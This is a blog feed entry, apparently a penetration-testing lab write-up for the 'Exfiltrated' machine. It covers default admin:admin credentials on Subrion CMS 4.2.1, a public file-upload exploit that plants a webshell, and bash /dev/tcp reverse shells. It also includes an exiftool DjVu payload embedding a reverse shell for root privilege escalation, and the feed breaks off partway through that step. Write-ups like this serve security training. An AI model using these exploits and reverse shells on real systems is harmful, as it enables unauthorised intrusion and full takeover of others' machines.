<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://jayngng.github.io/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://jayngng.github.io/" rel="alternate" type="text/html" /><updated>2021-09-10T00:12:36+10:00</updated><id>https://jayngng.github.io/blog/feed.xml</id><entry><title type="html">Exfiltrated - OSPG</title><link href="https://jayngng.github.io/blog/exfiltrated-ospg/" rel="alternate" type="text/html" title="Exfiltrated - OSPG" /><published>2021-09-09T08:30:29+10:00</published><updated>2021-09-09T08:30:29+10:00</updated><id>https://jayngng.github.io/blog/exfiltrated---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/exfiltrated-ospg/">&lt;h1 id=&quot;summary&quot;&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;In this writeup, we’ll exploit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subrion v4.2.1&lt;/code&gt; CMS to secure the inital foothold. We’ll then escalate our privilege via a &lt;strong&gt;crontab&lt;/strong&gt; service that executes the exploitable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/services.txt
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Inspecting the outputs, we hit on a few compelling directories of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service.&lt;/p&gt;

&lt;p&gt;Navigating to each of them, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/panel/&lt;/code&gt; directory redirects us to a new page.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$URL&lt;/span&gt;/panel/                      
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;                                                                                
&amp;lt;html &lt;span class=&quot;nv&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;en&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ltr&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                                                                    
    &amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                     
        &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
        &amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IE=Edge&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                                 
        &amp;lt;title&amp;gt;Login :: Powered by Subrion 4.2&amp;lt;/title&amp;gt;                                         
        &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;width=device-width, initial-scale=1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        &amp;lt;meta &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;generator&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Subrion CMS - Open Source Content Management System&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The page is running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subrion v4.2.1 CMS&lt;/code&gt;, and we are asked to provide admin credentials.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;subrion-weak-credentials&quot;&gt;&lt;strong&gt;Subrion Weak Credentials&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Let’s us test some default combinations of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:password&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subrion:subrion&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root:toor&lt;/code&gt; …&lt;/p&gt;

&lt;p&gt;Luckily, the first combination (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;) allows us to bypass the login prompt and land on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admin Dashboard&lt;/code&gt; page.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;subrion-v421-file-upload-bypass-to-rce&quot;&gt;&lt;strong&gt;Subrion v4.2.1 File Upload Bypass to RCE&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;We can further examine the CMS public vulnerabilities with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit Subrion 4.2.1
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
 Exploit Title                                                                                                                                              |  Path
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
Subrion CMS 4.2.1 - File Upload Bypass to RCE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                               | php/webapps/49876.py
&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can safely assume that the target system &lt;strong&gt;might be vulnerable&lt;/strong&gt; to RCE due to &lt;strong&gt;the similar version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Subrion&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; credentials are compromised, we can continue mouting our attacks by executing the following commands&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;searchsploit &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php/webapps/49876.py &lt;span class=&quot;c&quot;&gt;# → Copy the exploit script to current directory.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 49876.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://exfiltrated.offsec/panel/ &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; admin &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; admin &lt;span class=&quot;c&quot;&gt;# → execute the copied script given URL, admin username and password.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to connect to: http://exfiltrated.offsec/panel/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Success!
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Got CSRF token: HDUgrsxjx6on2NWuf6kfmKLDxgcfXy7QIDVebkAo
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to log &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Login Successful!

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Generating random name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Webshell...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Generated webshell name: tqrdcqpnkrgchnr

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Trying to Upload Webshell..
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/tqrdcqpnkrgchnr.phar 

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.122%2F80+0%3E%261%22 &lt;span class=&quot;c&quot;&gt;# → call URL-encoded reverse shell&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The original reverse shell is as the follow:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.122/80 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the commands are executed, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the connection at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.122] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.122.163] 57592
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;973&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;crontab-service&quot;&gt;Crontab Service&lt;/h4&gt;
&lt;p&gt;Local enumeration reveals an interesting entry of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab&lt;/code&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
...
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    bash /opt/image-exif.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The shell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/image-exif.sh&lt;/code&gt; will be executed every one minute by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s us take a closer look at its content.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /opt/image-exif.sh
&lt;span class=&quot;c&quot;&gt;#! /bin/bash&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#07/06/18 A BASH script to collect EXIF metadata &lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n metadata directory cleaned! &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;IMAGES&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/var/www/html/subrion/uploads&apos;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;META&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/opt/metadata&apos;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;openssl rand &lt;span class=&quot;nt&quot;&gt;-hex&lt;/span&gt; 5&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LOGFILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$META&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n Processing EXIF metadata now... &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IMAGES&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jpg&quot;&lt;/span&gt; | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;filename&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;do 
    &lt;/span&gt;exiftool &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$IMAGES&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$LOGFILE&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n Processing is finished! &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Primarily, the script will look for any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jpg&lt;/code&gt; file in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/subrion/uploads&lt;/code&gt; directory and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; against that file.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exiftool-to-rce&quot;&gt;&lt;strong&gt;Exiftool to RCE&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Recently, a Security Researcher spotted a RCE vulnerability in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool &amp;lt; v12.24&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To check the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; version, we execute:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@exfiltrated:/var/www/html/subrion/uploads&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-ver&lt;/span&gt;
11.x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The result implies that the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; might be exploitable. We can test our theory by navigating along the &lt;a href=&quot;https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce&quot;&gt;PoC&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;On the local terminal, we execute&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; djvulibre-bin &lt;span class=&quot;c&quot;&gt;# → Install dependencies&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payload &lt;span class=&quot;c&quot;&gt;# → Create a payload file with the content is a reverse shell.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;metadata &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;bash -c \&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.63/80 0&amp;gt;&amp;amp;1\&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bzz payload payload.bzz &lt;span class=&quot;c&quot;&gt;# → Compress the payload &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;djvumake exploit.djvu &lt;span class=&quot;nv&quot;&gt;INFO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1,1&apos;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;BGjp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/null &lt;span class=&quot;nv&quot;&gt;ANTz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;payload.bzz &lt;span class=&quot;c&quot;&gt;# → Compile the exploit.djvu file&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;configfile &lt;span class=&quot;c&quot;&gt;# → Prepare a configfile having the following content.                            &lt;/span&gt;
%Image::ExifTool::UserDefined &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# All EXIF tags are added to the Main table, and WriteGroup is used to&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# specify where the tag is written (default is ExifIFD if not specified):&lt;/span&gt;
    &lt;span class=&quot;s1&quot;&gt;&apos;Image::ExifTool::Exif::Main&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Example 1.  EXIF:NewEXIFTag&lt;/span&gt;
        0xc51b &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            Name &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;HasselbladExif&apos;&lt;/span&gt;,
            Writable &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;string&apos;&lt;/span&gt;,
            WriteGroup &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;IFD0&apos;&lt;/span&gt;,
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
        &lt;span class=&quot;c&quot;&gt;# add more user-defined EXIF tags here...&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,
&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#end%&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-config&lt;/span&gt; configfile  &lt;span class=&quot;s1&quot;&gt;&apos;-HasselbladExif&amp;lt;=exploit.djvu&apos;&lt;/span&gt; sample.jpg &lt;span class=&quot;c&quot;&gt;# → Embed the payload into the sample.jpg image&lt;/span&gt;
